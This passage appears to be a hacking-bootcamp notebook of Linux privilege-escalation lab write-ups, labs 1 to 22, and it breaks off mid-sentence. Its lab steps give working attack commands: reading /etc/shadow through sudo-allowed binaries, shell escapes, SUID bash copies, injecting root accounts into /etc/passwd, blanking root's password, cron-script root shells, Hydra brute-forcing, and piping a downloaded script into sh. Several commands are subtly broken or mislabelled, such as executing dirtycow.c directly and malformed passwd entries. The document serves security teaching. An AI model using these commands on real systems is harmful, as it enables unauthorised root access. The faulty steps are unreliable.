# Linux Privilege Escalation - Day 5

## Overview
This document outlines the labs completed on 08/03/2025 during the hacking bootcamp, focusing on privilege escalation techniques in Linux environments.

## Table of Contents
- [Lab 1: Linux Privilege Escalation](#lab-1-linux-privilege-escalation)
- [Lab 2: Sudo Example 1](#lab-2-sudo-example-1)
- [Lab 3: Sudo Example 2](#lab-3-sudo-example-2)
- [Lab 4: Sudo Example 3](#lab-4-sudo-example-3)
- [Lab 5: Sudo](#lab-5-sudo)
- [Lab 6: SUID Example](#lab-6-suid-example)
- [Lab 7: SUID](#lab-7-suid)
- [Lab 8: Enumeration](#lab-8-enumeration)
- [Lab 9: Insecure File Permissions Example 1](#lab-9-insecure-file-permissions-example-1)
- [Lab 10: Enumeration Example](#lab-10-enumeration-example)
- [Lab 11: Search for Kernel Vulnerabilities Example](#lab-11-search-for-kernel-vulnerabilities-example)
- [Lab 12: Exploits Example 2](#lab-12-exploits-example-2)
- [Lab 13: Search for Vulnerabilities Example 2](#lab-13-search-for-vulnerabilities-example-2)
- [Lab 14: Kernel Exploitation Example 2](#lab-14-kernel-exploitation-example-2)
- [Lab 15: Privileged Groups Example](#lab-15-privileged-groups-example)
- [Lab 16: Kernel Exploitation](#lab-16-kernel-exploitation)
- [Lab 17: Cron Example 1](#lab-17-cron-example-1)
- [Lab 18: Cron Example 2](#lab-18-cron-example-2)
- [Lab 19: Cron](#lab-19-cron)
- [Lab 20: Automatic Enumeration Example](#lab-20-automatic-enumeration-example)
- [Lab 21: Local Bruteforce](#lab-21-local-bruteforce)
- [Lab 22: Exploits](#lab-22-exploits)
- [Lab 23: Privileged Groups](#lab-23-privileged-groups)
- [Lab 24: Insecure File Permissions](#lab-24-insecure-file-permissions)
- [Lab 25: Searching for Kernel Vulnerabilities](#lab-25-searching-for-kernel-vulnerabilities)
- [Lab 26: Local Bruteforce Example](#lab-26-local-bruteforce-example)
- [Lab 27: Insecure File Permissions Example 2](#lab-27-insecure-file-permissions-example-2)

## Labs

### Lab 1: Linux Privilege Escalation
#### Objective
Escalate privileges on a Linux system by exploiting misconfigurations.

#### Vulnerabilities
- Misconfigurations: Weak permissions or services allow unauthorized privilege escalation.

#### Requirements
Target Linux system must be accessible with user-level credentials.

#### Steps
1. **Setup**
   - Connect via ssh using credentials `user:123456` and verify access to the target system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate system information and permissions.
   ```bash
   id && uname -a
   sudo -l
   ```
3. **Exploitation**
   - You notice that one of the binaries that you can execute as `user` with sudo rights without password is `date`. Exploit it to get the flag (hash of root password).
   ```bash
   sudo date -l /etc/shadow
   ```

#### Why It Works
Misconfigured permissions allow low-privileged users to access critical system files without root privilege access, granting elevated access.

#### Alternatives
- Use automated scripts like LinPEAS for enumeration or exploit other binaries.

#### Resources
- [Linux Privilege Escalation Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux](https://www.hacktricks.xyz/pentesting/pentesting-linux)

#### Notes
- Don't mind the php website deployed on port 80, connect directly via ssh.

---

### Lab 2: Sudo Example 1
#### Objective
Escalate privileges by exploiting a sudo misconfiguration allowing command execution.

#### Vulnerabilities
- Sudo Misconfiguration: User can run specific commands as root via sudo.

#### Requirements
Target Linux system must have a sudo rule allowing command execution.

#### Steps
1. **Setup**
   - Verify sudo permissions.
   ```bash
   sudo -l
   ```
2. **Reconnaissance**
   - Identify commands allowed by sudo.
   ```bash
   sudo -l | grep NOPASSWD
   ```
3. **Exploitation**
   - Run a permitted command to gain a root shell. In our case, it was `find`.
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```

#### Why It Works
Sudo rules allowing unrestricted command execution enable escalation to root privileges.

#### Alternatives
- Use sudo to edit critical files directly.

#### Resources
- [Sudo Misconfiguration Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#sudo](https://www.hacktricks.xyz/pentesting/pentesting-linux#sudo)

#### Notes
- Check for NOPASSWD entries in sudo -l output.

---

### Lab 3: Sudo Example 2
#### Objective
Escalate privileges by abusing a sudo rule allowing a specific script execution.

#### Vulnerabilities
- Sudo Script Misconfiguration: Writable scripts executed via sudo allow code injection.

#### Requirements
Target Linux system must have a sudo rule with no password required for an exploitable binary.

#### Steps
1. **Setup**
   - Verify sudo permissions.
   ```bash
   sudo -l
   ```
2. **Reconnaissance**
   - Identify the vulnerable binary, `base64`.
   
3. **Exploitation**
   - Exploit it to read the flag fromt he root directory
   ```bash
   sudo base64 /root/flag | base64 --decode
   ```

#### Why It Works
- Misconfigurations allows attackers to access sensitive files granting root access.

#### Alternatives
- Use sudo to run a different privileged command.

#### Resources
- [Sudo Abuse Guide: https://gtfobins.github.io/gtfobins/sudo/](https://gtfobins.github.io/gtfobins/sudo/)

#### Notes
- TODO.

---

### Lab 4: Sudo Example 3
#### Objective
Escalate privileges by exploiting sudo access to a command with a writable script.

#### Vulnerabilities
- Poor script access control allows for editing of scripts and executing them as sudo without any password required

#### Requirements
Target Linux system must allow sudo execution of a writable script.

#### Steps
1. **Setup**
   - Verify sudo permissions.
   ```bash
   sudo -l
   ```
2. **Reconnaissance**
   - Identify the writable script. In our case it will be backup.sh.
   ```bash
   sudo -l | grep *.sh
   ```
3. **Exploitation**
   - Edit the script to execute root shell.
   ```bash
   cat > /path/to/script/backup.sh
   ```
   - Paste this while cat is running and the press Crtl+C
   ```bash
   #!/usr/bin/python3
   import os
   os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
   ```
   - After that, run `/tmp/bash -p` to get the root shell and find the flag in the /root directory.

#### Why It Works
The scripts clones the root shell and makes it accessible to a low privilege user.

#### Alternatives
- Use other shell-escaping tools like less, vim or more.

#### Resources
- [GTFOBins: https://gtfobins.github.io/](https://gtfobins.github.io/)
- Find  such scripts in the resources section of the repository

#### Notes
- Ensure that python3 is available. If not, convert the script into a bash shell.

---

### Lab 5: Sudo
#### Objective
Escalate privileges by leveraging sudo misconfigurations for arbitrary command execution.

#### Vulnerabilities
- Broad Sudo Rules: Overly permissive sudo configurations allow root access.

#### Requirements
Target Linux system must have permissive sudo rules.

#### Steps
1. **Setup**
   - Verify sudo permissions.
   ```bash
   sudo -l
   ```
2. **Reconnaissance**
   - You will notice that the user is allowed to execute commands to a certain file as sudo without password. Notice the wildcard at the end.
   ```bash
   (ALL) NOPASSWD: /usr/bin/cat /home/user/notes/*
   ```
3. **Exploitation**
   - Get flag via path traversal.
   ```bash
   sudo cat /home/user/notes/../../../root/flag
   ```

#### Why It Works
Permissive sudo rules allow low-privileged users to execute arbitrary commands or read restricted files as root.

#### Alternatives
- Edit /etc/passwd using sudo for persistent access.

#### Resources
- [Sudo Misconfiguration Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#sudo](https://www.hacktricks.xyz/pentesting/pentesting-linux#sudo)

#### Notes
- Check for sudo rules allowing ALL commands without password.

---

### Lab 6: SUID Example
#### Objective
Escalate privileges by exploiting an SUID binary with known vulnerabilities.

#### Vulnerabilities
- SUID Misconfiguration: SUID binaries allow execution with root privileges.

#### Requirements
Target Linux system must have a vulnerable SUID binary.

#### Steps
1. **Setup**
   - Verify user access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Identify SUID binaries.
   ```bash
   find / -perm -4000 2>/dev/null
   ```
3. **Exploitation**"
   - Exploit a known vulnerable SUID binary (e.g., sed). Create hash for newroot password's "password".
   ```bash
   openssl passwd -6 -salt xyz password
   ```
   Output example: $6$xyz$HASH...
   - Add newroot user to /etc/shadow with sed
   ```bash
   sed -i '1i newroot:$6$xyz$HASH...:0:0:root:/root:/bin/bash' /etc/passwd
   ```
   - Switch to newroot `su newroot` and get the flag in /root/flag
#### Why It Works
SUID binaries run with root privileges, and vulnerabilities allow execution of arbitrary commands.

#### Alternatives
- Exploit other SUID binaries listed in GTFOBins.
- If /etc/shadow is writable, you can remove the newroot password `sed -i 's/^root:.*/root::0:0:99999:7:::/' /etc/shadow` then connect as root `su root`.
#### Resources
- [GTFOBins SUID: https://gtfobins.github.io/+suid/](https://gtfobins.github.io/+suid/)

#### Notes
- Redirect errors to /dev/null to avoid permission denied messages.

---

### Lab 7: SUID
#### Objective
Gain root access by exploiting a misconfigured SUID binary.

#### Vulnerabilities
- SUID Misconfiguration: Custom SUID binaries with insecure code allow privilege escalation.

#### Requirements
Target Linux system must have an SUID binary.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Locate custom SUID binaries.
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```
3. **Exploitation**
   - Execute the SUID binary (date) to read the flag.
   ```bash
   date -f /root/flag
   ```

#### Why It Works
Custom SUID binaries with insecure code execute as root, allowing privilege escalation.

#### Alternatives
- Analyze binary with strings or gdb for vulnerabilities.

#### Resources
- [Linux SUID Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#suid](https://www.hacktricks.xyz/pentesting/pentesting-linux#suid)

#### Notes
- Check binary permissions and functionality before execution.

---

### Lab 8: Enumeration
#### Objective
Identify privilege escalation vectors through manual system enumeration.

#### Vulnerabilities
- Exposed Information: System details reveal misconfigurations or vulnerabilities.

#### Requirements
Target Linux system must be accessible with user-level credentials.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate system information, users, and permissions using linpeas.
   ```bash
   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```
3. **Exploitation**
   - To get the flag, run linpeas and grep "cybered{".
   ```bash
   ./linpeas.sh | grep "cybered{"
   ```

#### Why It Works
Enumeration with linpeas uncovers misconfigurations like writable files or weak permissions, enabling escalation.

#### Alternatives
- Use automated tools like LinEnum for faster enumeration.

#### Resources
- [Linux Enumeration Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration](https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration)

#### Notes
- Check for writable system files and sudo permissions.

---

### Lab 9: Insecure File Permissions Example 1
#### Objective
Escalate privileges by exploiting writable system files.

#### Vulnerabilities
- Insecure Permissions: Critical files readable by low-privileged users.

#### Requirements
Target Linux system must have such files (e.g., vpn configs).

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate system information, users, and permissions using linpeas.
   ```bash
   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```
3. **Exploitation**
   - You will notice the openvpn file `/etc/openvpn/pass.txt`. It contains root user credentials.
   ```bash
   cat /etc/openvpn/pass.txt
   ```
   - Switch to root user and get the flag `su root`  in /root/flag.

#### Why It Works
Because system administrator is not smart enough :).

#### Alternatives
- Modify /etc/shadow for password-based escalation.

#### Resources
- [Insecure Permissions Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#file-permissions](https://www.hacktricks.xyz/pentesting/pentesting-linux#file-permissions)

#### Notes
- Verify file permissions with ls -l.

---

### Lab 10: Enumeration Example
#### Objective
Discover privilege escalation vectors by enumerating system configurations.

#### Vulnerabilities
- Exposed Configurations: System files reveal exploitable settings.

#### Requirements
Target Linux system must be accessible with user credentials.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate cron jobs and SUID binary.
   ```bash
   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```
3. **Exploitation**
   - Get the flag by grepping while enumerating "cybered{".
   ```bash
   ./linpeas.sh | grep "cybered{"
   ```

#### Why It Works
Enumeration reveals the flag in a process.

#### Alternatives
- Use LinEnum for automated enumeration.

#### Resources
- [Linux Enumeration Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration](https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration)

#### Notes
- Check cron jobs and SUID binaries thoroughly in real-life cases.

---

### Lab 11: Search for Kernel Vulnerabilities Example
#### Objective
Identify kernel vulnerabilities for privilege escalation.

#### Vulnerabilities
- Kernel Vulnerabilities: Outdated kernels are susceptible to known exploits.

#### Requirements
Target Linux system must have an outdated kernel.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Check kernel version.
   ```bash
   uname -r
   ```
3. **Exploitation**
   - Search for known exploits using a tool like linux-exploit-suggester.
   ```bash
   ./linux-exploit-suggester.sh
   ```

#### Why It Works
Outdated kernels have known vulnerabilities that can be exploited for root access.

#### Alternatives
- Manually search Exploit-DB for kernel exploits.

#### Resources
- [Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

#### Notes
- Download linux-exploit-suggester if not available.

---

### Lab 12: Exploits Example 2
#### Objective
Escalate privileges using a known exploit for a vulnerable service.

#### Vulnerabilities
- Vulnerable Service: Outdated software with exploitable flaws.

#### Requirements
Target Linux system must run a vulnerable service (e.g., old Apache version).

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Identify running services and versions.
   ```bash
   netstat -tulnp
   ```
3. **Exploitation**
   - Use a known exploit from Exploit-DB.
   ```bash
   searchsploit apache | grep privilege
   ```

#### Why It Works
Vulnerable services have known exploits that grant elevated privileges when executed.

#### Alternatives
- Use Metasploit for automated exploit delivery.

#### Resources
- [Exploit-DB: https://www.exploit-db.com/](https://www.exploit-db.com/)

#### Notes
- Verify service versions before searching for exploits.

---

### Lab 13: Search for Vulnerabilities Example 2
#### Objective
Identify system vulnerabilities for privilege escalation.

#### Vulnerabilities
- System Misconfigurations: Exposed services or files reveal exploitable flaws.

#### Requirements
Target Linux system must be accessible with user credentials.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate system services and files.
   ```bash
   ps aux && find / -writable 2>/dev/null
   ```
3. **Exploitation**
   - Exploit a writable service configuration.
   ```bash
   echo 'root:0:0:root:/root:/bin/bash' >> /etc/passwd
   ```

#### Why It Works
Enumeration identifies writable files or misconfigured services that allow privilege escalation.

#### Alternatives
- Use LinEnum for automated vulnerability scanning.

#### Resources
- [HackTricks Linux: https://www.hacktricks.xyz/pentesting/pentesting-linux](https://www.hacktricks.xyz/pentesting/pentesting-linux)

#### Notes
- Focus on writable files and running processes.

---

### Lab 14: Kernel Exploitation Example 2
#### Objective
Escalate privileges by exploiting a known kernel vulnerability.

#### Vulnerabilities
- Kernel Exploit: Specific kernel versions have exploitable flaws.

#### Requirements
Target Linux system must have a vulnerable kernel version.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Check kernel version.
   ```bash
   uname -r
   ```
3. **Exploitation**
   - Run a kernel exploit (e.g., Dirty COW).
   ```bash
   ./dirtycow.c
   ```

#### Why It Works
Known kernel vulnerabilities like Dirty COW allow attackers to gain root privileges.

#### Alternatives
- Search Exploit-DB for alternative kernel exploits.

#### Resources
- [Dirty COW Exploit: https://www.exploit-db.com/exploits/40839](https://www.exploit-db.com/exploits/40839)

#### Notes
- Compile the exploit on the target system if needed.

---

### Lab 15: Privileged Groups Example
#### Objective
Escalate privileges by leveraging membership in a privileged group.

#### Vulnerabilities
- Privileged Groups: Groups like sudo or disk grant elevated access.

#### Requirements
Target Linux system must assign the user to a privileged group.

#### Steps
1. **Setup**
   - Verify user group membership.
   ```bash
   id
   ```
2. **Reconnaissance**
   - Check for privileged groups (e.g., sudo, disk).
   ```bash
   groups
   ```
3. **Exploitation**
   - Use group privileges to gain root access.
   ```bash
   sudo /bin/bash
   ```

#### Why It Works
Membership in privileged groups grants access to root-level commands or files.

#### Alternatives
- Exploit disk group to access raw disk data.

#### Resources
- [Linux Groups Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#groups](https://www.hacktricks.xyz/pentesting/pentesting-linux#groups)

#### Notes
- Check /etc/group for additional privileged groups.

---

### Lab 16: Kernel Exploitation
#### Objective
Gain root access by exploiting a kernel vulnerability.

#### Vulnerabilities
- Kernel Flaws: Outdated or unpatched kernels are exploitable.

#### Requirements
Target Linux system must have a vulnerable kernel.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Identify kernel version.
   ```bash
   uname -r
   ```
3. **Exploitation**
   - Run a kernel exploit from Exploit-DB.
   ```bash
   ./kernel_exploit
   ```

#### Why It Works
Unpatched kernels have vulnerabilities that allow root privilege escalation.

#### Alternatives
- Use linux-exploit-suggester for automated exploit discovery.

#### Resources
- [Exploit-DB Kernel Exploits: https://www.exploit-db.com/](https://www.exploit-db.com/)

#### Notes
- Verify kernel version compatibility with the exploit.

---

### Lab 17: Cron Example 1
#### Objective
Escalate privileges by exploiting a writable cron script.

#### Vulnerabilities
- Writable Cron Scripts: Cron jobs running as root with writable scripts allow code injection.

#### Requirements
Target Linux system must have a writable cron script.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Identify cron jobs and scripts.
   ```bash
   crontab -l && ls -l /etc/cron*
   ```
3. **Exploitation**
   - Modify a writable cron script to execute a root shell.
   ```bash
   echo 'bash -i' > /path/to/cron_script.sh
   ```

#### Why It Works
Writable cron scripts executed as root allow attackers to inject malicious commands.

#### Alternatives
- Create a new cron job if permissions allow.

#### Resources
- [Cron Exploitation Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs](https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs)

#### Notes
- Wait for the cron job to execute after modification.

---

### Lab 18: Cron Example 2
#### Objective
Gain root access by exploiting a cron job running a vulnerable command.

#### Vulnerabilities
- Cron Command Misconfiguration: Cron jobs running exploitable commands as root.

#### Requirements
Target Linux system must have a cron job with a vulnerable command.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Check cron jobs for vulnerable commands.
   ```bash
   cat /etc/crontab
   ```
3. **Exploitation**
   - Overwrite a command in PATH with a malicious script.
   ```bash
   echo 'bash -i' > /tmp/vuln_command && chmod +x /tmp/vuln_command
   ```

#### Why It Works
Cron jobs using commands in writable PATH directories allow attackers to execute malicious code as root.

#### Alternatives
- Modify cron job directly if writable.

#### Resources
- [Cron PATH Exploitation: https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs](https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs)

#### Notes
- Ensure the malicious script is in a writable PATH directory.

---

### Lab 19: Cron
#### Objective
Escalate privileges by exploiting misconfigured cron jobs.

#### Vulnerabilities
- Cron Misconfiguration: Cron jobs with weak permissions or insecure commands.

#### Requirements
Target Linux system must have misconfigured cron jobs.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Enumerate cron jobs and their permissions.
   ```bash
   ls -l /etc/cron* && cat /etc/crontab
   ```
3. **Exploitation**
   - Inject a malicious command into a writable cron script.
   ```bash
   echo 'bash -i' >> /path/to/cron_script.sh
   ```

#### Why It Works
Misconfigured cron jobs allow attackers to modify scripts or commands executed as root.

#### Alternatives
- Exploit cron jobs with environment variable manipulation.

#### Resources
- [Cron Exploitation Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs](https://www.hacktricks.xyz/pentesting/pentesting-linux#cron-jobs)

#### Notes
- Check cron job schedules to predict execution time.

---

### Lab 20: Automatic Enumeration Example
#### Objective
Identify privilege escalation vectors using automated enumeration tools.

#### Vulnerabilities
- System Misconfigurations: Tools like LinPEAS reveal exploitable settings.

#### Requirements
Target Linux system must be accessible with user credentials.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Run LinPEAS to enumerate vulnerabilities.
   ```bash
   ./linpeas.sh
   ```
3. **Exploitation**
   - Exploit a discovered vulnerability (e.g., writable /etc/passwd).
   ```bash
   echo 'hacker:0:0:root:/root:/bin/bash' >> /etc/passwd
   ```

#### Why It Works
Automated tools like LinPEAS identify misconfigurations and vulnerabilities quickly, enabling targeted escalation.

#### Alternatives
- Use LinEnum or other enumeration scripts.

#### Resources
- [LinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

#### Notes
- Download LinPEAS to the target system if needed.

---

### Lab 21: Local Bruteforce
#### Objective
Escalate privileges by brute-forcing local user credentials.

#### Vulnerabilities
- Weak Passwords: Local accounts with guessable passwords.

#### Requirements
Target Linux system must have a local account with weak credentials.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - List local users.
   ```bash
   cat /etc/passwd
   ```
3. **Exploitation**
   - Brute-force a user’s password using Hydra.
   ```bash
   hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
   ```

#### Why It Works
Weak local passwords allow attackers to gain access to privileged accounts via brute-forcing.

#### Alternatives
- Use John the Ripper for offline password cracking.

#### Resources
- [Hydra Documentation: https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

#### Notes
- Ensure a suitable wordlist is available.

---

### Lab 22: Exploits
#### Objective
Escalate privileges using known exploits for system services.

#### Vulnerabilities
- Vulnerable Services: Outdated software with exploitable flaws.

#### Requirements
Target Linux system must run a vulnerable service.

#### Steps
1. **Setup**
   - Verify access to the system.
   ```bash
   whoami
   ```
2. **Reconnaissance**
   - Identify running services and versions.
   ```bash
   dpkg -l
   ```
3. **Exploitation**
   - Run a known exploit from Exploit-DB.
   ```bash
   searchsploit <SERVICE_NAME> | grep privilege
   ```

#### Why It Works
Outdated services have known vulnerabilities that allow privilege escalation when exploited.

#### Alternatives
- Use Metasploit for automated exploit execution.

#### Resources
- [Exploit-DB: https://www.exploit-db.com/](https://www.exploit-db.com/)

#### Notes
- Verify service versions before selecting